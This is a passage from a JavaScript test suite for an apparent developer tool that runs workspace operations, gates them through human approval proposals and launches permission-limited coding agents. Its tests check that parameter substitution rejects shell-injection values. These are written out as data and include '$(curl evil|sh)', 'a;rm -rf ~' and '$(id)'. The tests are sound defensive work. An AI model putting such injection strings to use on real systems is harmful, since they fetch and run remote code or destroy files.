  assert.strictEqual(res.body.data.run.run_id, runId);
  assert.strictEqual(res.body.data.log_tail, undefined, 'no log tail for Hester');
  assert.ok(typeof (await domain('result', { run_id: runId }, LOCAL)).body.data.log_tail === 'string');
  // Unknown workspace refused.
  assert.strictEqual((await domain('run', { workspace: '/etc', name: 'bench' }, HESTER)).status, 400);
  // stop: Hester may not stop a confirm: true operation.
  assert.strictEqual((await domain('stop', { workspace: ws, name: 'flash-dev' }, HESTER)).status, 403);
});

test('params: quoted placeholders and metacharacters; Hester params go through a proposal; approval runs the shown line', async () => {
  const q = cfg.quotedPlaceholders(`git commit -am "{msg}" && echo '{x}' {y} "a\\"{z}"`);
  assert.deepStrictEqual([...q.entries()].sort(), [['msg', '"'], ['x', "'"], ['z', '"']]);
  assert.deepStrictEqual(cfg.substituteParams('git commit -am "{msg}"', [], { msg: '$(curl evil|sh)' }).invalid, ['msg']);
  assert.deepStrictEqual(cfg.substituteParams("echo '{x}'", [], { x: 'a;rm -rf ~' }).invalid, ['x']);
  assert.deepStrictEqual(cfg.substituteParams("echo '{x}'", [], { x: 'a b' }).invalid, ['x'], 'word splitting inside single quotes');
  assert.strictEqual(cfg.substituteParams("echo '{x}'", [], { x: 'plain-word.txt' }).line, "echo ''plain-word.txt''");
  assert.strictEqual(cfg.substituteParams('echo {x}', [], { x: '$(id)' }).line, "echo '$(id)'", 'an unquoted placeholder is single-quoted');
  assert.deepStrictEqual(cfg.substituteParams('echo {x}', [], { x: '$(id)' }, { strict: true }).invalid, ['x']);
  assert.deepStrictEqual(cfg.substituteParams('echo {x}', [], { x: 'fix: the thing' }, { strict: true }).invalid, []);

  const file = path.join(ws, '.lee', 'operations.yaml');
  const orig = fs.readFileSync(file, 'utf8');
  const bump = () => {
    const t = new Date(Date.now() + Math.floor(Math.random() * 100000));
    fs.utimesSync(file, t, t);
  };
  fs.writeFileSync(file, orig.replace('operations:\n', 'operations:\n  - name: commit-wip\n    command: git commit -am "{msg}"\n  - name: greet\n    command: echo {who}\n'));
  bump();
  try {
    let n = tabs.sends.length;
    let r = await ipc('opsRun', { workspace: ws, name: 'commit-wip', params: { msg: '$(curl evil|sh)' }, confirmed: true });
    assert.strictEqual(r.error, 'invalid_params');
    assert.strictEqual(tabs.sends.length, n, 'nothing typed');
    r = await ipc('opsRun', { workspace: ws, name: 'commit-wip', params: { msg: 'wip' } });
    assert.ok(r.success, JSON.stringify(r));
    tabs.end(r.run.pty_id, 0);
    // A device's metacharacters are refused outright.
    assert.strictEqual((await domain('run', { workspace: ws, name: 'greet', params: { who: '$(id)' } }, DEVICE)).status, 400);
    // Hester with params: a proposal showing the substituted line; nothing typed.
    n = tabs.sends.length;
    const out = await domain('run', { workspace: ws, name: 'greet', params: { who: 'world' } }, HESTER);
    assert.strictEqual(out.status, 202, JSON.stringify(out));
    assert.strictEqual(tabs.sends.length, n);
    const entry = cockpitBus.feed.list(ws).find((e) => e.ref.proposal_id === out.body.proposal_id);
    assert.strictEqual(entry.actions[0].confirm_text, `cd '${ws}' && echo 'world'`);
    // The definition changes before the click: the old proposal can't run the new text.
    fs.writeFileSync(file, orig.replace('operations:\n', 'operations:\n  - name: greet\n    command: echo {who} --and-more\n'));
    bump();
    const changed = await cockpitBus.actOnFeed(entry.id, 'approve', {}, LOCAL);
    assert.strictEqual(changed.success, false);
    assert.strictEqual(changed.error, 'changed');
    assert.strictEqual(tabs.sends.length, n, 'nothing typed');
    const fresh = cockpitBus.feed.list(ws).find((e) => e.ref.proposal_id === changed.data.proposal_id);
    assert.strictEqual(fresh.actions[0].confirm_text, `cd '${ws}' && echo 'world' --and-more`);
    const ok = await cockpitBus.actOnFeed(fresh.id, 'approve', {}, LOCAL);
    assert.ok(ok.success, JSON.stringify(ok));
    assert.ok(tabs.sends.at(-1).text.endsWith(`echo 'world' --and-more`));
    tabs.end(ok.data.run.pty_id, 0);
  } finally {
    fs.writeFileSync(file, orig);
    bump();
  }
  assert.ok(!cockpitBus.ops.snapshot(ws).operations.some((o) => o.def.name === 'greet'));
});

test('no command text on disk: ad-hoc tab label, echoed line, ad-hoc output', async () => {
  const opened = tabs.opened.length;
  const secret = 'psql postgres://admin:pw-SECRET@db/prod -c select';
  const r = await ipc('opsRun', { workspace: ws, command: secret, confirmed: true });
  assert.ok(r.success, JSON.stringify(r));
  assert.strictEqual(tabs.opened.length, opened + 1);
  assert.strictEqual(tabs.opened.at(-1).label, '▶ adhoc:psql');
  tabs.end(r.run.pty_id, 0, 'row 1\n');
  const dir = path.join(tmpHome, '.lee', 'ops', rtMod.wsidFor(ws));
  for (const f of fs.readdirSync(dir)) assert.ok(!fs.readFileSync(path.join(dir, f), 'utf8').includes('pw-SECRET'), `${f} holds no command text`);
  assert.ok(!fs.existsSync(path.join(dir, 'adhoc_psql.last.log')));
  const b = await ipc('opsRun', { workspace: ws, name: 'bench' });
  tabs.end(b.run.pty_id, 0, 'cold_start_ms=1000\n');
  const log = fs.readFileSync(path.join(dir, 'bench.last.log'), 'utf8');
  assert.strictEqual(log, 'cold_start_ms=1000\n', 'the echoed line is dropped');
  assert.strictEqual(rtMod.dropEchoedLine('$ make\nout\n'), 'out\n');
});

test('stop: Ctrl-C into the running tab', async () => {
  const r = await ipc('opsRun', { workspace: ws, name: 'failing' });
  const out = await domain('stop', { workspace: ws, name: 'failing' }, HESTER);
  assert.strictEqual(out.status, 200, JSON.stringify(out));
  assert.deepStrictEqual(ptyWrites.at(-1), [r.run.pty_id, '\x03']);
  assert.strictEqual(eventsOf('tab.input').at(-1).data.chars, 1);
  tabs.end(r.run.pty_id, 130);
  assert.strictEqual((await ipc('opsStop', ws, 'failing')).error, 'not_running');
});

test('hand-typed commands link to operations; long-running status; crash is blocking', async () => {
  tabs.add(60, { cwd: ws });
  tabs.start(60, 'npm   run dev');
  let web = cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'web');
  assert.strictEqual(web.status, 'running');
  assert.strictEqual(web.linked_pty_id, 60);
  assert.strictEqual(eventsOf('operation.status').at(-1).data.to, 'running');
  tabs.end(60, 130, '', 'user');
  web = cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'web');
  assert.strictEqual(web.status, 'stopped');
  tabs.start(60, 'vite --host');
  tabs.end(60, 1, '', 'user');
  web = cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'web');
  assert.strictEqual(web.status, 'crashed');
  const crash = cockpitBus.feed.list(ws).find((e) => e.kind === 'failure' && e.ref.op === 'web');
  assert.strictEqual(crash.severity, 'blocking');
  assert.ok(sentToWindows.some(([ch, p]) => ch === 'status:push' && p.type === 'error' && p.message.includes('web')));
  assert.deepStrictEqual(eventsOf('operation.status').filter((e) => e.data.op === 'web').map((e) => e.data.to), ['running', 'stopped', 'running', 'crashed']);
  // A different cwd doesn't link.
  tabs.add(61, { cwd: path.join(ws, 'app') });
  tabs.start(61, 'npm run dev', path.join(ws, 'app'));
  assert.strictEqual(cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'web').linked_pty_id, 60);
  tabs.end(61, 0, '', 'user');
  // Manual linking.
  assert.ok((await ipc('opsLinkTab', 61, ws, 'web')).success);
  assert.strictEqual(cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'web').linked_pty_id, 61);
  assert.ok((await ipc('opsLinkTab', 61, ws, null)).success);
});

test('a run that ends at once: result after run, crash state kept', async () => {
  tabs.endOnSend = 127;
  let r;
  try {
    r = await ipc('opsRun', { workspace: ws, name: 'web', confirmed: true });
  } finally {
    tabs.endOnSend = null;
  }
  assert.ok(r.success, JSON.stringify(r));
  await waitFor(() => eventsOf('operation.result').some((e) => e.data.run_id === r.run.run_id));
  const idx = (type) => events.findIndex((e) => e.type === type && e.data.run_id === r.run.run_id);
  assert.ok(idx('operation.run') >= 0 && idx('operation.run') < idx('operation.result'), 'operation.run before operation.result');
  assert.strictEqual(cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'web').status, 'crashed');
  // Hand-typed: a command that dies before git answers still logs run before result.
  tabs.add(62, { cwd: ws });
  tabs.start(62, 'npm run dev');
  tabs.end(62, 1, '', 'user');
  const handRun = eventsOf('operation.run').length;
  await waitFor(() => eventsOf('operation.run').length > handRun - 1 && events.filter((e) => e.type === 'operation.result' && e.data.by === 'user').length > 0);
  await sleep(50);
  const lastRun = eventsOf('operation.run').filter((e) => e.data.pty_id === 62).pop();
  const lastRes = events.findIndex((e) => e.type === 'operation.result' && e.data.run_id === lastRun.data.run_id);
  assert.ok(events.indexOf(lastRun) < lastRes, 'hand-typed: run before result');
});

test('confirm suggestions: operations.yaml round trip keeps hand edits; config.yaml untouched', async () => {
  const cfgBefore = fs.readFileSync(path.join(ws, '.lee', 'config.yaml'));
  const r = await ipc('opsConfirm', ws, ['app:build', 'fw:flash']);
  assert.ok(r.success, JSON.stringify(r));
  const doc = yaml.load(fs.readFileSync(path.join(ws, '.lee', 'operations.yaml'), 'utf8'));
  assert.strictEqual(doc.custom_top, 1, 'top-level hand field kept');
  assert.strictEqual(doc.operations.find((o) => o.name === 'lint2').note, 'keep me', 'entry hand field kept');
  const fl = doc.operations.find((o) => o.name === 'fw:flash');
  assert.strictEqual(fl.confirm, true);
  assert.strictEqual(fl.detected_from, 'fw (idf.py)');
  assert.match(fl.confirmed_at, /^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$/);
  assert.ok(fs.readFileSync(path.join(ws, '.lee', 'operations.yaml'), 'utf8').startsWith('# Written by Lee'));
  assert.deepStrictEqual(fs.readFileSync(path.join(ws, '.lee', 'config.yaml')), cfgBefore, 'config.yaml byte-identical');
  assert.deepStrictEqual(eventsOf('operation.confirmed').at(-1).data, { names: ['app:build', 'fw:flash'], count: 2 });
  assert.strictEqual(eventsOf('ui.ceremony').filter((e) => e.data.target === 'operations' && e.data.action === 'confirm').length, 1, 'one ceremony per click');
  const snap = cockpitBus.ops.snapshot(ws);
  assert.strictEqual(snap.operations.find((o) => o.def.name === 'app:build').source, 'operations-file');
  assert.ok(!snap.suggestions.some((s) => s.def.name === 'app:build'));
  // Dismiss, setFlag, save.
  assert.ok((await ipc('opsDismissSuggestion', ws, 'mobile:run')).success);
  assert.ok(yaml.load(fs.readFileSync(path.join(ws, '.lee', 'operations.yaml'), 'utf8')).dismissed_suggestions.includes('mobile:run'));
  assert.ok(!cockpitBus.ops.snapshot(ws).suggestions.some((s) => s.def.name === 'mobile:run'));
  assert.strictEqual(await cockpitBus.ops.setFlag(ws, 'lint2', 'notify_on_done', true), true);
  assert.strictEqual(await cockpitBus.ops.setFlag(ws, 'bench', 'notify_on_done', true), false, 'config.yaml ops are not rewritten');
  assert.strictEqual(yaml.load(fs.readFileSync(path.join(ws, '.lee', 'operations.yaml'), 'utf8')).operations.find((o) => o.name === 'lint2').notify_on_done, true);
  assert.strictEqual((await ipc('opsSave', ws, { name: 'bench', kind: 'oneshot', command: 'x' })).error, 'defined_in_config');
  assert.ok((await ipc('opsSave', ws, { name: 'lint2', kind: 'oneshot', command: 'npm run lint -- --fix' })).success);
  const saved = yaml.load(fs.readFileSync(path.join(ws, '.lee', 'operations.yaml'), 'utf8')).operations.find((o) => o.name === 'lint2');
  assert.strictEqual(saved.command, 'npm run lint -- --fix');
  assert.strictEqual(saved.note, 'keep me');
  // D's suggest() shows up as an unconfirmed suggestion.
  cockpitBus.ops.suggest(ws, { name: 'rebuild-all', kind: 'oneshot', command: 'make clean && make' }, 'toil/repeated-sequence');
  assert.ok(cockpitBus.ops.snapshot(ws).suggestions.some((s) => s.def.name === 'rebuild-all' && s.detected_from === 'toil/repeated-sequence'));
});

test('operation agents: launch request and claude argv; C2 guards', async () => {
  const res = await ipc('opsAgent', { workspace: ws, purpose: 'fix', op: 'failing' });
  assert.ok(res.success, JSON.stringify(res));
  const l = launcher.launches.at(-1).req;
  assert.strictEqual(l.title, 'Fix: failing');
  assert.strictEqual(l.kind, 'chore');
  assert.strictEqual(l.lead, 'delegate');
  assert.strictEqual(l.worktree, false);
  assert.deepStrictEqual(l.origin, { kind: 'operation', ref: 'failing' });
  assert.ok(l.prompt.startsWith('You are an operation agent in Lee. The operation "failing" failed.'));
  assert.ok(l.prompt.includes('Command: false'));
  const argv = buildClaudeArgs(l, { session_id: '00000000-0000-4000-8000-000000000000', slug: 'x' });
  const flag = (f) => argv[argv.indexOf(f) + 1];
  assert.strictEqual(flag('--model'), 'claude-haiku-4-5-20251001');
  assert.strictEqual(flag('--permission-mode'), 'manual');
  assert.strictEqual(flag('--tools'), 'Bash,Read,Grep,Glob');
  assert.strictEqual(flag('--allowedTools'), 'Read,Grep,Glob,Bash(false:*)');
  assert.ok(!argv.includes('--worktree') && !argv.includes('-w'));
  assert.strictEqual(argv[argv.indexOf('--') + 1], l.prompt);
  // flash-dev: its own allowed_tools appended.
  await ipc('opsAgent', { workspace: ws, purpose: 'fix', op: 'flash-dev' });
  assert.deepStrictEqual(launcher.launches.at(-1).req.allowed_tools, ['Read', 'Grep', 'Glob', 'Bash(idf.py:*)', 'Bash(ls /dev/cu.*)']);
  assert.strictEqual(agentMod.bashRuleFor('npm run build'), 'Bash(npm run:*)');
  // Never an interpreter- or wrapper-wide allow (C3).
  assert.strictEqual(agentMod.bashRuleFor('python -m pytest'), 'Bash(python -m pytest:*)');
  assert.strictEqual(agentMod.bashRuleFor('node --test'), 'Bash(node --test:*)');
  assert.strictEqual(agentMod.bashRuleFor('uv run pytest'), 'Bash(uv run pytest:*)');
  assert.strictEqual(agentMod.bashRuleFor('pdm run test'), 'Bash(pdm run test:*)');
  assert.strictEqual(agentMod.bashRuleFor(`sh -c 'make all'`), null);
  assert.strictEqual(agentMod.bashRuleFor('bash scripts/ci.sh'), null);
  assert.strictEqual(agentMod.bashRuleFor('npx vitest run'), 'Bash(npx vitest run:*)');
  assert.strictEqual(agentMod.bashRuleFor('python -c "import os"'), null);
  assert.strictEqual(agentMod.bashRuleFor('. /x/export.sh >/dev/null && idf.py build'), 'Bash(idf.py build:*)');
  // Ad-hoc; multi_step uses plan_model.
  await ipc('opsAgent', { workspace: ws, purpose: 'adhoc', request: 'flash the tdeck and open the monitor', multi_step: true });
  const a = launcher.launches.at(-1).req;
  assert.strictEqual(a.model, 'sonnet');
  assert.strictEqual(a.title, 'Op: flash the tdeck and open the monitor');
  assert.strictEqual(a.label, 'Op agent', 'the request never becomes a tab label');
  assert.deepStrictEqual(a.allowed_tools, ['Read', 'Grep', 'Glob', 'Bash(ls:*)']);
  assert.deepStrictEqual(a.origin, { kind: 'operation', ref: null });
  assert.strictEqual(eventsOf('opagent.launch').length, 3);
  assert.ok(!JSON.stringify(eventsOf('opagent.launch')).includes('flash the tdeck'), 'no request text in events');
  // Feed failure action "fix-with-agent" (a human click).
  const fail = cockpitBus.feed.list(ws, { includeClosed: true }).find((e) => e.kind === 'failure' && e.ref.op === 'failing');
  const before = launcher.launches.length;
  cockpitBus.feed.setState(fail.id, 'open');
  const act = await cockpitBus.actOnFeed(fail.id, 'fix-with-agent', {}, LOCAL);
  assert.ok(act.success, JSON.stringify(act));
  assert.strictEqual(launcher.launches.length, before + 1);
  // Without a launcher.
  cockpitBus.setLauncher(null);
  assert.strictEqual((await ipc('opsAgent', { workspace: ws, purpose: 'adhoc', request: 'x' })).error, 'launcher_unavailable');
  cockpitBus.setLauncher(launcher);
});

test('agent turns: save-as-operation and escalate proposals', async () => {
  const res = await ipc('opsAgent', { workspace: ws, purpose: 'fix', op: 'failing' });
  const pty = res.pty_id;
  copilotBus.logEvent({
    type: 'agent.turn_end', source: 'hook', workspace: ws,
    data: { session_id: res.session_id, pty_id: pty, busy_ms: 10, summary: 'Rebuilt.\noperation: clean-build | make clean all | app' },
  });
  const save = cockpitBus.feed.list(ws).find((e) => e.title === "Save 'clean-build' as an operation?");
  assert.ok(save, 'save proposal');
  assert.strictEqual(save.actions[0].confirm_text, 'make clean all');
  assert.ok(cockpitBus.ops.snapshot(ws).suggestions.some((s) => s.def.name === 'clean-build' && s.def.cwd === 'app'));
  assert.ok((await cockpitBus.actOnFeed(save.id, 'approve', {}, LOCAL)).success);
  assert.strictEqual(cockpitBus.ops.snapshot(ws).operations.find((o) => o.def.name === 'clean-build').source, 'operations-file');
  // Blocked -> escalate proposal (nudge claimed), approve -> escalate launch.
  copilotBus.logEvent({
    type: 'agent.turn_end', source: 'hook', workspace: ws,
    data: { session_id: res.session_id, pty_id: pty, busy_ms: 10, summary: 'Needs a code change.', lee_status: { status: 'blocked', summary: 'tsconfig is wrong', blockers: null, files: [], next: null } },
  });
  assert.ok(eventsOf('nudge.claim').some((e) => e.data.item_ref === `op:${ws}:failing` && e.data.granted));
  const esc = cockpitBus.feed.list(ws).find((e) => e.title === 'Escalate failing to a task?');
  assert.ok(esc, 'escalate proposal');
  assert.ok(esc.actions[0].confirm_text.startsWith('You are continuing work an operation agent started on "failing". Its report: tsconfig is wrong.'));
  const n = launcher.launches.length;
  assert.ok((await cockpitBus.actOnFeed(esc.id, 'approve', {}, LOCAL)).success);
  const e = launcher.launches[n].req;
  assert.strictEqual(e.model, 'sonnet');
  assert.strictEqual(e.permission_mode, 'acceptEdits');
  assert.strictEqual(e.worktree, true);
  assert.strictEqual(e.lead, 'delegate');
  assert.deepStrictEqual(e.origin, { kind: 'operation', ref: 'failing' });
  assert.strictEqual(eventsOf('opagent.escalate').at(-1).data.from_task_id, res.task_id);
});

test('Feed actions: create-task and open-tab', async () => {
  const r = await ipc('opsRun', { workspace: ws, name: 'failing' });
  tabs.end(r.run.pty_id, 1);
  const fail = cockpitBus.feed.list(ws).find((e) => e.kind === 'failure' && e.ref.op === 'failing');
  const open = await cockpitBus.actOnFeed(fail.id, 'open-tab', {}, LOCAL);
  assert.ok(open.success, JSON.stringify(open));
  assert.ok(sentToWindows.some(([ch, p]) => ch === COCKPIT_IPC.goInto && p.pty_id === r.run.pty_id));
  const ct = await cockpitBus.actOnFeed(fail.id, 'create-task', {}, DEVICE);
  assert.ok(ct.success);
  const t = launcher.tasks.at(-1);
  assert.strictEqual(t.title, 'Fix failing operation failing');
  assert.deepStrictEqual(t.origin, { kind: 'operation', ref: 'failing' });
  assert.ok(!t.note.includes('boom'), 'no output in the relayed note');
});

test('status probes: ports, health (non-2xx, three failures)', async () => {
  const dir = path.join(tmpHome, 'work', 'probe');
  write(path.join(dir, '.lee', 'config.yaml'), 'operations:\n  - { name: srv, kind: long-running, command: "node srv.js", ports: [4999], health: "http://127.0.0.1:4999/" }\n');
  let portOpen = true;
  let health = 'ok';
  const rt = new rtMod.OpsRuntime({
    workspaces: () => [dir],
    home: tmpHome,
    probePort: async () => portOpen,
    probeHealth: async () => health,
    toolEnv: () => toolEnv,
  });
  const status = () => rt.snapshot(dir).operations[0].status;
  assert.strictEqual(status(), 'idle');
  await rt.probeAll();
  assert.strictEqual(status(), 'running');
  health = 'bad';
  await rt.probeAll();
  assert.strictEqual(status(), 'unhealthy');
  health = 'fail';
  await rt.probeAll();
  await rt.probeAll();
  assert.strictEqual(status(), 'running', 'two failures are not enough');
  await rt.probeAll();
  assert.strictEqual(status(), 'unhealthy');
  health = 'ok';
  await rt.probeAll();
  assert.strictEqual(status(), 'running');
  portOpen = false;
  await rt.probeAll();
  assert.strictEqual(status(), 'idle');
  rt.stop();
  // The real probes, against a local server.
  const srv = net.createServer((s) => {
    s.on('error', () => {});
    s.end('HTTP/1.1 503 x\r\nContent-Length: 0\r\n\r\n');
  });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const port = srv.address().port;
  assert.strictEqual(await rtMod.probeLocalPort(port), true);
  assert.strictEqual(await rtMod.probeLocalHealth(`http://127.0.0.1:${port}/`), 'bad');
  srv.close();
  assert.strictEqual(await rtMod.probeLocalPort(port), false);
  assert.strictEqual(await rtMod.probeLocalHealth(`http://127.0.0.1:${port}/`), 'fail');
});

test('no command text in the event log', () => {
  const text = JSON.stringify(events.filter((e) => e.type.startsWith('operation.') || e.type.startsWith('opagent.')));
  for (const s of ['echo cold_start_ms', 'make build-all', 'rm -rf build', 'printenv', 'idf.py -p', 'ls -la']) assert.ok(!text.includes(s), `no "${s}"`);
});

(async () => {
  let failed = 0;
  for (const [name, fn] of tests) {
    try {
      await fn();
      console.log(`ok   ${name}`);
    } catch (err) {
      failed++;
      console.log(`FAIL ${name}\n     ${err && err.stack ? err.stack.split('\n').slice(0, 4).join('\n     ') : err}`);
    }
  }
  opsMain.shutdownCockpitOps();
  fs.rmSync(tmpHome, { recursive: true, force: true });
  console.log(failed ? `\n${failed} failed` : `\nall ${tests.length} passed`);
  process.exit(failed ? 1 : 0);
})();
